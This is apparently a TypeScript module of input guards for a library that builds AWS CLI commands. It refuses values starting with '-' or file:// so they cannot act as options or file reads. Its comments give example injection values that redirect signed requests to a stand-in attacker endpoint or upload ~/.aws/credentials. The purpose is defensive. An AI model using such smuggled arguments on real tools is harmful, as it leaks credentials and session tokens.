// Copyright (c) 2026 the Zuke contributors
// SPDX-License-Identifier: MIT

/**
 * The argv guards every settings class shares. Internal to the package.
 *
 * Each closes a way a value could make the AWS CLI do something other than
 * what the settings say:
 *
 * - **A token that starts with `-`** is read by the CLI as the next option.
 *   An option's own value is safe when sent as one `--flag=value` token
 *   ({@link option}), but a positional operand or one element of a
 *   list-valued option is a token of its own, so
 *   `repositoryNames("api", "--endpoint-url=https://attacker")` would have
 *   sent a signed request — session token included — to someone else.
 *   {@link operand} and {@link operands} refuse such a value.
 * - **A value that starts with `file://` or `fileb://`** is replaced by the
 *   contents of that file: CLI v2 reads any parameter written that way. A
 *   description of `file://~/.aws/credentials` sends the credentials file to
 *   AWS. {@link freeText} refuses it on the setters that take free text.
 *
 * @module
 */

/** The prefixes the AWS CLI reads a parameter's value from instead of taking it. */
const FILE_PREFIXES = ["file://", "fileb://"];

/** `--flag=value` as one token, so a value starting with `-` stays the value. */
export function option(flag: string, value: string | number): string {
  return `${flag}=${value}`;
}

/** `value`, refused when the CLI would read it as an option. */
export function operand(task: string, what: string, value: string): string {
  if (value.startsWith("-")) {
    throw new Error(
      `AwsTasks.${task}: the ${what} value "${value}" starts with '-', which ` +
        "the AWS CLI would read as an option rather than a value. Refused — " +
        "a path can be written ./-name instead.",
    );
  }
  return value;
}

/** Every element of a list-valued option, each checked by {@link operand}. */
export function operands(
  task: string,
  flag: string,
  values: readonly string[],
): string[] {
  return values.map((value) => operand(task, flag, value));
}

/**
 * `text`, refused when the CLI would read a file in its place. For a setter
 * that takes free text — a description, a payload, a query.
 */
export function freeText(task: string, flag: string, text: string): string {
  if (FILE_PREFIXES.some((prefix) => text.startsWith(prefix))) {
    throw new Error(
      `AwsTasks.${task}: a ${flag} value starting with file:// or fileb:// ` +
        "is read from that file by the AWS CLI, not sent as written — the " +
        "file's contents would leave the machine. Refused.",
    );
  }
  return text;
}

/** `value`, refused unless it is a finite number. */
export function finite(task: string, what: string, value: number): number {
  if (!Number.isFinite(value)) {
    throw new Error(`${task}: ${what} needs a finite number, got ${value}.`);
  }
  return value;
}
